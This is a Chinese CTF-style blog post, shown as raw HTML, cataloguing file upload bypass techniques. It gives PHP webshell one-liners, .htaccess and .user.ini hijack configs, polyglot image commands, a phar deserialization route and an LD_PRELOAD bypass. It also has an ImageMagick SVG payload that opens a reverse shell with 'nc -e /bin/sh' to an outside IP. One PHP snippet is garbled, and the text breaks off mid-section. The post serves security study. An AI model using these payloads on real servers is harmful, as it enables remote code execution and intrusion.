<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文件上传漏洞 | Fan's Blog</title><meta name="author" content="Lyifan"><meta name="copyright" content="Lyifan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="第一部分：基础与经典绕过 (The Classics)这部分是基础，但在某些签到题或复杂攻击链的第一步中仍然有效。 1. 前端验证绕过 原理：JavaScript 在浏览器端检查文件后缀。 利用： 禁用浏览器 JS。 先上传合法后缀（如 .jpg），抓包（Burp Suite），将文件名修改为 .php 后发送。    2. MIME-Type 验证绕过 原理：后端仅检查 HTTP 请求包中的 C">
<meta property="og:type" content="article">
<meta property="og:title" content="文件上传漏洞">
<meta property="og:url" content="http://example.com/2025/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Fan&#39;s Blog">
<meta property="og:description" content="第一部分：基础与经典绕过 (The Classics)这部分是基础，但在某些签到题或复杂攻击链的第一步中仍然有效。 1. 前端验证绕过 原理：JavaScript 在浏览器端检查文件后缀。 利用： 禁用浏览器 JS。 先上传合法后缀（如 .jpg），抓包（Burp Suite），将文件名修改为 .php 后发送。    2. MIME-Type 验证绕过 原理：后端仅检查 HTTP 请求包中的 C">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/%E5%A4%B4%E5%83%8F.jpg">
<meta property="article:published_time" content="2025-11-29T01:16:52.000Z">
<meta property="article:modified_time" content="2025-12-22T08:19:20.654Z">
<meta property="article:author" content="Lyifan">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/%E5%A4%B4%E5%83%8F.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "文件上传漏洞",
  "url": "http://example.com/2025/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
  "image": "http://example.com/img/%E5%A4%B4%E5%83%8F.jpg",
  "datePublished": "2025-11-29T01:16:52.000Z",
  "dateModified": "2025-12-22T08:19:20.654Z",
  "author": [
    {
      "@type": "Person",
      "name": "Lyifan",
      "url": "http://example.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '文件上传漏洞',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/custom.css" /><meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/img/%E8%83%8C%E6%99%AF.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/%E6%A0%87%E7%AD%BE/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 分类</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/sql-injection/"><i class="fa-fw fas fa-database"></i><span> SQL Injection</span></a></li><li><a class="site-page child" href="/categories/xss/"><i class="fa-fw fas fa-code"></i><span> XSS</span></a></li><li><a class="site-page child" href="/categories/upload/"><i class="fa-fw fas fa-file-upload"></i><span> upload</span></a></li><li><a class="site-page child" href="/categories/ssrf/"><i class="fa-fw fas fa-network-wired"></i><span> SSRF</span></a></li><li><a class="site-page child" href="/categories/include/"><i class="fa-fw fas fa-file-code"></i><span> Include</span></a></li><li><a class="site-page child" href="/categories/unserialize/"><i class="fa-fw fas fa-project-diagram"></i><span> Unserialize</span></a></li><li><a class="site-page child" href="/categories/xxe/"><i class="fa-fw fas fa-file-code"></i><span> XXE</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/%E5%8F%8B%E9%93%BE/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Fan's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">文件上传漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/%E6%A0%87%E7%AD%BE/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 分类</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/sql-injection/"><i class="fa-fw fas fa-database"></i><span> SQL Injection</span></a></li><li><a class="site-page child" href="/categories/xss/"><i class="fa-fw fas fa-code"></i><span> XSS</span></a></li><li><a class="site-page child" href="/categories/upload/"><i class="fa-fw fas fa-file-upload"></i><span> upload</span></a></li><li><a class="site-page child" href="/categories/ssrf/"><i class="fa-fw fas fa-network-wired"></i><span> SSRF</span></a></li><li><a class="site-page child" href="/categories/include/"><i class="fa-fw fas fa-file-code"></i><span> Include</span></a></li><li><a class="site-page child" href="/categories/unserialize/"><i class="fa-fw fas fa-project-diagram"></i><span> Unserialize</span></a></li><li><a class="site-page child" href="/categories/xxe/"><i class="fa-fw fas fa-file-code"></i><span> XXE</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/%E5%8F%8B%E9%93%BE/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">文件上传漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-29T01:16:52.000Z" title="发表于 2025-11-29 09:16:52">2025-11-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-22T08:19:20.654Z" title="更新于 2025-12-22 16:19:20">2025-12-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/upload/">upload</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="第一部分：基础与经典绕过-The-Classics"><a href="#第一部分：基础与经典绕过-The-Classics" class="headerlink" title="第一部分：基础与经典绕过 (The Classics)"></a>第一部分：基础与经典绕过 (The Classics)</h3><p>这部分是基础，但在某些签到题或复杂攻击链的第一步中仍然有效。</p>
<h4 id="1-前端验证绕过"><a href="#1-前端验证绕过" class="headerlink" title="1. 前端验证绕过"></a>1. 前端验证绕过</h4><ul>
<li><strong>原理</strong>：JavaScript 在浏览器端检查文件后缀。</li>
<li><strong>利用</strong>：<ul>
<li>禁用浏览器 JS。</li>
<li>先上传合法后缀（如 <code>.jpg</code>），抓包（Burp Suite），将文件名修改为 <code>.php</code> 后发送。</li>
</ul>
</li>
</ul>
<h4 id="2-MIME-Type-验证绕过"><a href="#2-MIME-Type-验证绕过" class="headerlink" title="2. MIME-Type 验证绕过"></a>2. MIME-Type 验证绕过</h4><ul>
<li><strong>原理</strong>：后端仅检查 HTTP 请求包中的 <code>Content-Type</code> 字段。</li>
<li><strong>利用</strong>：抓包将 <code>Content-Type: application/octet-stream</code> 修改为白名单类型，如 <code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>。</li>
</ul>
<h4 id="3-后缀名黑名单绕过"><a href="#3-后缀名黑名单绕过" class="headerlink" title="3. 后缀名黑名单绕过"></a>3. 后缀名黑名单绕过</h4><ul>
<li><strong>原理</strong>：代码使用黑名单（如禁止 <code>.php</code>），但未覆盖所有可解析后缀或存在解析差异。</li>
<li><strong>Trick 列表</strong>：<ul>
<li><strong>特殊后缀</strong>：<code>.php3</code>, <code>.php5</code>, <code>.phtml</code>, <code>.phps</code> (需 Apache配置支持 <code>AddType application/x-httpd-php .php5</code>)。</li>
<li><strong>大小写绕过</strong>：<code>.PhP</code> (Windows 不区分大小写，Linux 需代码未做 <code>strtolower</code>)。</li>
<li><strong>点与空格（Windows 特性）</strong>：<ul>
<li><code>.php.</code> (Windows 保存文件时会自动去除末尾的点)。</li>
<li><code>.php </code> (Windows 保存文件时会自动去除末尾的空格)。</li>
<li><code>.php. .</code> (点+空格+点 组合拳)。</li>
</ul>
</li>
<li><strong>NTFS流特性（Windows 特性）</strong>：<ul>
<li><code>.php::$DATA</code>：Windows 会忽略 <code>::$DATA</code>，直接保存为 <code>.php</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-后缀名白名单绕过"><a href="#4-后缀名白名单绕过" class="headerlink" title="4. 后缀名白名单绕过"></a>4. 后缀名白名单绕过</h4><ul>
<li><strong>原理</strong>：代码只允许特定后缀（如 jpg, png），通常比较安全，需结合解析漏洞或文件包含。</li>
<li><strong>Trick 列表</strong>：<ul>
<li><strong>00截断 (%00)</strong>：<ul>
<li><em>条件</em>：PHP &lt; 5.3.4 且 <code>magic_quotes_gpc=Off</code>。</li>
<li><em>原理</em>：底层 C 语言将 <code>\0</code> 视为字符串结束。</li>
<li><em>利用</em>：文件名改为 <code>shell.php%00.jpg</code>（URL编码）或在 Hex 视图中手动改为 <code>00</code>。</li>
</ul>
</li>
<li><strong>双后缀&#x2F;多后缀</strong>：<code>shell.jpg.php</code> (取决于解析逻辑是从左往右还是从右往左，见下文 Apache 解析漏洞)。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="第二部分：服务器配置与解析漏洞-Core-Mechanics"><a href="#第二部分：服务器配置与解析漏洞-Core-Mechanics" class="headerlink" title="第二部分：服务器配置与解析漏洞 (Core Mechanics)"></a>第二部分：服务器配置与解析漏洞 (Core Mechanics)</h3><p>这是 CTF 中分的重点，往往利用服务器中间件的特性。</p>
<h4 id="1-Apache-htaccess-攻击"><a href="#1-Apache-htaccess-攻击" class="headerlink" title="1. Apache .htaccess 攻击"></a>1. Apache <code>.htaccess</code> 攻击</h4><ul>
<li><p><strong>原理</strong>：Apache 允许目录下的 <code>.htaccess</code> 文件覆盖全局配置。如果题目允许上传名为 <code>.htaccess</code> 的文件，我们可以自定义解析规则。</p>
</li>
<li><p><strong>Trick 1: 将所有文件解析为 PHP</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>上传该文件后，再上传一个包含 Shell 的 <code>shell.jpg</code>，Apache 会将其作为 PHP 执行。</p>
</li>
<li><p><strong>Trick 2: 指定扩展名解析</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Trick 3: 结合伪协议 (新颖)</strong><br>如果内容有检测（如 <code>&lt;?</code> 被过滤），可利用 base64 编码包含：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg</span><br><span class="line"><span class="attribute">php_value</span> auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=shell.jpg&quot;</span></span><br></pre></td></tr></table></figure>

<p>此时 <code>shell.jpg</code> 内容可以是 base64 编码后的 webshell。</p>
</li>
</ul>
<h4 id="2-user-ini-攻击-近年-CTF-高频"><a href="#2-user-ini-攻击-近年-CTF-高频" class="headerlink" title="2. .user.ini 攻击 (近年 CTF 高频)"></a>2. <code>.user.ini</code> 攻击 (近年 CTF 高频)</h4><ul>
<li><p><strong>原理</strong>：在 <strong>CGI&#x2F;FastCGI</strong> 模式（如 Nginx + PHP-FPM）下，<code>.htaccess</code> 不生效，但 PHP 会读取 <code>.user.ini</code>。</p>
</li>
<li><p><strong>条件</strong>：</p>
<ol>
<li>Server API 为 FastCGI 模式。</li>
<li>上传目录下必须 <strong>已存在一个正常的 PHP 文件</strong> (如 <code>index.php</code>)，因为 <code>.user.ini</code> 是作为配置被那个 PHP 文件加载的，它自己无法独立执行。</li>
</ol>
</li>
<li><p><strong>Trick</strong>: 利用 <code>auto_prepend_file</code> 或 <code>auto_append_file</code>。</p>
<ul>
<li><p>上传 <code>.user.ini</code> 内容：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=shell.jpg</span><br></pre></td></tr></table></figure>
</li>
<li><p>上传 <code>shell.jpg</code> (即 Webshell)。</p>
</li>
<li><p>访问该目录下的正常文件（如 <code>/upload/index.php</code>），<code>shell.jpg</code> 的内容会被自动包含并执行。</p>
</li>
</ul>
</li>
</ul>
<h4 id="3-Nginx-解析漏洞-配置错误"><a href="#3-Nginx-解析漏洞-配置错误" class="headerlink" title="3. Nginx 解析漏洞 (配置错误)"></a>3. Nginx 解析漏洞 (配置错误)</h4><ul>
<li><strong>原理</strong>：配置 <code>location ~ \.php$</code> 时逻辑不严谨（<code>cgi.fix_pathinfo=1</code>）。</li>
<li><strong>利用</strong>：上传 <code>shell.jpg</code>，访问 <code>http://site.com/shell.jpg/a.php</code>。Nginx 看到后缀是 <code>.php</code> 交给 PHP 处理，PHP 找不到 <code>a.php</code>，会向前递归解析 <code>shell.jpg</code>。</li>
</ul>
<h4 id="4-Apache-解析漏洞-旧版本-特定配置"><a href="#4-Apache-解析漏洞-旧版本-特定配置" class="headerlink" title="4. Apache 解析漏洞 (旧版本&#x2F;特定配置)"></a>4. Apache 解析漏洞 (旧版本&#x2F;特定配置)</h4><ul>
<li><strong>原理</strong>：Apache 某些版本识别后缀是从右往左，遇到不认识的后缀就跳过。</li>
<li><strong>利用</strong>：上传 <code>shell.php.xxx.yyy</code>。Apache 不认识 <code>yyy</code> 和 <code>xxx</code>，最后解析为 <code>.php</code>。</li>
</ul>
<hr>
<h3 id="第三部分：内容检测与-WAF-绕过-Advanced-Bypass"><a href="#第三部分：内容检测与-WAF-绕过-Advanced-Bypass" class="headerlink" title="第三部分：内容检测与 WAF 绕过 (Advanced Bypass)"></a>第三部分：内容检测与 WAF 绕过 (Advanced Bypass)</h3><p>当后缀和 MIME 都无法利用时，就要在文件内容上下功夫。</p>
<h4 id="1-标签与代码风格绕过"><a href="#1-标签与代码风格绕过" class="headerlink" title="1. 标签与代码风格绕过"></a>1. 标签与代码风格绕过</h4><p>如果 <code>&lt;?php</code> 被过滤：</p>
<ul>
<li><strong>短标签</strong>：<code>&lt;?= eval($_POST[1]); ?&gt;</code> (不需要 <code>short_open_tag=On</code>，PHP 5.4+ 默认支持)。</li>
<li><strong>Script 标签</strong>：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;</code> (PHP 7.0 以前有效，老题常见)。</li>
<li><strong>ASP 风格</strong>：<code>&lt;% eval($_POST[1]); %&gt;</code> (需开启 <code>asp_tags</code>)。</li>
</ul>
<h4 id="2-文件头-Magic-Bytes-伪造"><a href="#2-文件头-Magic-Bytes-伪造" class="headerlink" title="2. 文件头 (Magic Bytes) 伪造"></a>2. 文件头 (Magic Bytes) 伪造</h4><ul>
<li><strong>原理</strong>：后端检测文件头前几个字节判断类型（如 <code>getimagesize()</code>）。</li>
<li><strong>利用</strong>：<ul>
<li><strong>GIF</strong>：文件内容开头加 <code>GIF89a</code>。</li>
<li><strong>BMP</strong>：文件开头加 <code>BM</code>。</li>
<li><strong>PNG&#x2F;JPG</strong>：复制真实图片的 Hex 头部。</li>
</ul>
</li>
<li><strong>图片马制作</strong>：<ul>
<li>Linux: <code>cat image.jpg shell.php &gt; polyglot.jpg</code></li>
</ul>
</li>
</ul>
<h4 id="3-二次渲染-Secondary-Rendering-绕过"><a href="#3-二次渲染-Secondary-Rendering-绕过" class="headerlink" title="3. 二次渲染 (Secondary Rendering) 绕过"></a>3. 二次渲染 (Secondary Rendering) 绕过</h4><ul>
<li><strong>原理</strong>：服务器接收图片后，使用 GD 库或 ImageMagick 对其进行 resize、crop 或重编码，原始的 Webshell 字符串会被打乱或删除。</li>
<li><strong>利用</strong>：需寻找 <strong>渲染后未变动的区域</strong>。<ul>
<li><strong>GIF</strong>: 比较简单，只需保留头部和特定块，通常利用工具或手工插入不被破坏的空隙。</li>
<li><strong>JPG&#x2F;PNG</strong>: 极难。通常需要脚本暴力碰撞（Fuzzing）或使用特定工具（如 <code>GD-PHP-Payload</code>）生成一张经过 GD 库处理后 Shell 依然存在的图片。</li>
<li><strong>Trick</strong>: 只要能够上传成功，且能结合<strong>文件包含漏洞</strong>，通过包含该图片即可 RCE。</li>
</ul>
</li>
</ul>
<h4 id="4"><a href="#4" class="headerlink" title="4. &lt;? 起始符过滤绕过 (Base64&#x2F;Encoding)"></a>4. <code>&lt;?</code> 起始符过滤绕过 (Base64&#x2F;Encoding)</h4><ul>
<li><strong>场景</strong>：内容检测禁止 <code>&lt;?</code>。</li>
<li><strong>Trick</strong>: 结合伪协议或 <code>.htaccess</code> 的解码功能（如前文所述）。如果不允许伪协议，可利用 <code>iconv</code> 转换。</li>
</ul>
<hr>
<h3 id="第四部分：近年高阶-Trick-与新利用方式"><a href="#第四部分：近年高阶-Trick-与新利用方式" class="headerlink" title="第四部分：近年高阶 Trick 与新利用方式"></a>第四部分：近年高阶 Trick 与新利用方式</h3><p>这部分是区分高手的关键，涉及竞争、底层库特性及 PHP 新特性。</p>
<h4 id="1-竞争上传-Race-Condition"><a href="#1-竞争上传-Race-Condition" class="headerlink" title="1. 竞争上传 (Race Condition)"></a>1. 竞争上传 (Race Condition)</h4><ul>
<li><p><strong>场景</strong>：逻辑是“先保存文件 -&gt; 检查内容&#x2F;后缀 -&gt; 如果非法则删除”。</p>
</li>
<li><p><strong>原理</strong>：在“保存”和“删除”之间存在极短的时间差（几毫秒）。</p>
</li>
<li><p><strong>利用</strong>：</p>
<ul>
<li><p>使用多线程并发脚本（Burp Intruder 或 Python）。</p>
</li>
<li><p>不断上传 <code>shell.php</code>。</p>
</li>
<li><p>不断访问 <code>shell.php</code>。</p>
</li>
<li><p>一旦在删除前访问成功，让 <code>shell.php</code> 生成一个不被删除的新马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                           <span class="meta">?&gt;</span><span class="string">&quot;); ?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="2-结合-phar-协议的反序列化"><a href="#2-结合-phar-协议的反序列化" class="headerlink" title="2. 结合 phar:// 协议的反序列化"></a>2. 结合 <code>phar://</code> 协议的反序列化</h4><ul>
<li><strong>场景</strong>：限制了后缀名为白名单（如只准 jpg），但代码中有 <code>file_exists</code>、<code>is_dir</code>、<code>filesize</code> 等文件操作函数，且参数可控。</li>
<li><strong>利用</strong>：<ul>
<li>生成一个 Phar 文件，将 Payload（反序列化利用链）写入 Phar 的 Metadata。</li>
<li>将 Phar 文件修改后缀为 <code>.jpg</code> 上传。</li>
<li>通过 <code>phar://path/to/shell.jpg/test</code> 触发反序列化，达成 RCE。</li>
</ul>
</li>
</ul>
<h4 id="3-ImageMagick-漏洞-CVE-历史遗留与变种"><a href="#3-ImageMagick-漏洞-CVE-历史遗留与变种" class="headerlink" title="3. ImageMagick 漏洞 (CVE 历史遗留与变种)"></a>3. ImageMagick 漏洞 (CVE 历史遗留与变种)</h4><ul>
<li><p><strong>原理</strong>：ImageMagick 在解析特定格式（如 MVG, SVG）时存在命令执行。</p>
</li>
<li><p><strong>Trick</strong>: 上传这就不仅仅是 WebShell 了，而是直接 RCE。</p>
<ul>
<li><p><strong>POC (SVG 举例)</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">href</span>=<span class="string">&quot;msl:nc -e /bin/sh 1.2.3.4 4444&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>近年 CTF 中常考 GhostScript 相关的漏洞（解析 PDF&#x2F;EPS 时）。</p>
</li>
</ul>
</li>
</ul>
<h4 id="4-iconv-转码攻击-WAF-Bypass"><a href="#4-iconv-转码攻击-WAF-Bypass" class="headerlink" title="4. iconv 转码攻击 (WAF Bypass)"></a>4. <code>iconv</code> 转码攻击 (WAF Bypass)</h4><ul>
<li><p><strong>场景</strong>：WAF 严格过滤了 <code>php</code>, <code>eval</code>, <code>system</code> 等关键字，但允许上传并存在文件包含，或者允许 <code>.user.ini</code> 指定编码。</p>
</li>
<li><p><strong>利用</strong>：利用字符编码转换生成 Payload。</p>
<ul>
<li><p>例如，利用 UTF-7、UTF-16 或 UCS-2 等编码将 Webshell 编码，WAF 无法识别。</p>
</li>
<li><p>配合 <code>.user.ini</code>:</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_append_file</span>=<span class="string">&quot;php://filter/read=convert.iconv.utf-16le.utf-8/resource=shell.jpg&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>shell.jpg</code> 内部存储 UTF-16LE 编码的恶意代码，PHP 加载时转为 UTF-8 执行。</p>
</li>
</ul>
</li>
</ul>
<h4 id="5-利用-LD-PRELOAD-绕过-disable-functions"><a href="#5-利用-LD-PRELOAD-绕过-disable-functions" class="headerlink" title="5. 利用 LD_PRELOAD 绕过 disable_functions"></a>5. 利用 <code>LD_PRELOAD</code> 绕过 disable_functions</h4><ul>
<li><p><strong>场景</strong>：Shell 已上传，但 <code>system</code>, <code>exec</code> 等函数被禁用（disable_functions），且 <code>open_basedir</code> 限制较松。</p>
</li>
<li><p><strong>Trick</strong>:</p>
<ul>
<li><p>上传一个编译好的 <code>.so</code> 文件（劫持 <code>getuid</code> 或 <code>__attribute__((constructor))</code>）。</p>
</li>
<li><p>上传 <code>.php</code> 文件，设置环境变量：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/www/html/hack.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">// 触发系统调用</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>PHP 的 <code>mail()</code> 或 <code>imagick</code> 会调用系统二进制程序，从而加载恶意的 <code>.so</code> 执行命令。</p>
</li>
</ul>
</li>
</ul>
<h4 id="6-ZIP-TAR-软链接攻击-Symlink-Zip-Slip"><a href="#6-ZIP-TAR-软链接攻击-Symlink-Zip-Slip" class="headerlink" title="6. ZIP&#x2F;TAR 软链接攻击 (Symlink &#x2F; Zip Slip)"></a>6. ZIP&#x2F;TAR 软链接攻击 (Symlink &#x2F; Zip Slip)</h4><ul>
<li><strong>场景</strong>：系统允许上传压缩包并自动解压。</li>
<li><strong>Trick</strong>:<ul>
<li><strong>Zip Slip</strong>: 构造文件名包含 <code>../../</code> 的压缩包，解压时覆盖上层目录的关键文件（如覆盖 <code>index.php</code> 或 <code>/root/.ssh/authorized_keys</code>）。</li>
<li><strong>Symlink</strong>: 在 Linux 下创建一个软链接指向 <code>/etc/passwd</code>，压缩上传。解压后访问该文件，实际上读取的是 <code>/etc/passwd</code>。</li>
</ul>
</li>
</ul>
<h4 id="7-PHP-7-8-Segment-Fault-崩溃-生成临时文件"><a href="#7-PHP-7-8-Segment-Fault-崩溃-生成临时文件" class="headerlink" title="7. PHP 7&#x2F;8 Segment Fault (崩溃) 生成临时文件"></a>7. PHP 7&#x2F;8 Segment Fault (崩溃) 生成临时文件</h4><ul>
<li><strong>场景</strong>：无法直接上传文件到 Web 目录，但存在本地文件包含 (LFI)。</li>
<li><strong>Trick</strong>:<ul>
